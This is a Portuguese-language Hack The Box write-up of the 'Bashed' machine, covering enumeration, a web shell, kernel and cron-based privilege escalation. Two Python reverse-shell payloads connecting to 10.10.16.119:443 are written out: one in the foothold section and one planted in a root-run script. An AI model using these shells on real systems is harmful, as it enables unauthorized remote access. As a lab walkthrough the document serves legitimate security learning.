---
title: "Hack The Box - Bashed"
tags: [Linux,Easy,Linux Exploit Suggester,Wfuzz,CVE-2017-6074,dccp,LinEnum,Linpeas,Pspy]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/118>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos apenas a porta 80 aberta

> Portas 80 -> Servidor Web, bom ponto de entrada, uma vez que geralmente máquinas do HTB são exploradas por servidores Web

## Enumeração da porta 80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_web.png)

## Rodamos `wfuzz` na porta 80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_wfuzz.png)

# Exploração

## O que nos chamou atenção de cara foi a pasta `/dev`, então vamos verificar o que tem nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_web1.png)

```
Temos um shell...
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_web2.png)

### Fazemos um shell reverso na nossa máquina, para melhor trabalhar com ela

> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.119",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_web3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_web4.png)

# Escalação de privilégio

## Novamente rodaremos o `Linux Exploit Suggester` na máquina para procurar formas de se escalar privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_les.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_les1.png)

### Iremos explorar essa vulnerabilidade `CVE-2017-6074`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_les2.png)

### Procuramos por ela na internet

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp1.png)

### Copiamos pra nossa máquina e compilamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_comp.png)

### Após compilar, passamos pra máquina Bashed

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pwn0.png)

#### Tornamos executável e ganhamos shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pwn.png)

```
Explorando ela desse modo me sinto trapaceando, não gosto disso, então vamos explorar de maneira diferente agora, como deveria ter sido feito
```

________

## Rodamos o `LinEnum` para descobrir modo de escalar privilégio sem ser por Kernel

O script é esse:

> https://github.com/rebootuser/LinEnum

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_lin1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_lin2.png)

### Verificamos que podemos realizar comandos de sudo com o usuário scriptmanager

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_lin3.png)

### Nos tornamos `scritpmanager`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_lin4.png)

### Rodamos agora outro script para variar um pouco, o escolhido dessa vez é o `Linpeas`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas2.png)

### Encontramos o caminho das pedras para root em um arquivo `test.txt` que foi alterado há 5 minutos, possivelmente tem algum script rodando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas3.png)

### Entramos na pasta para verificar melhor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas4.png)

#### Olha que interessante! O arquito test.txt tem como dono root, ou seja quem executa o test.py é o root com algm cron

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas5.png)

### Alteramos o test.py com um python reverse shell

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.119",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas7.png)

#### Ganhamos um shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_peas8.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_root.png)

```
Máquina feita do jeito "certo", mas ainda não estou satisfeito de saber como esse script está rodando meu código em python como root
```
## Verificamos no "/etc/cron*", pra ver se tem algum cronjob de root rodando o script e não achamos nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_cron.png)

## Com o auxílio do `PSPY` consigo descobrir isso, como está sendo feita a execução

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pspy.png)

### Passamos ele para a máquinas Bashed

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pspy1.png)

### Executamos ele na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pspy2.png)

### Descobrimos, o sistema executa o script tesy.py, como demonstrado na imagem abaixo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bashed/Bashed_pspy3.png)
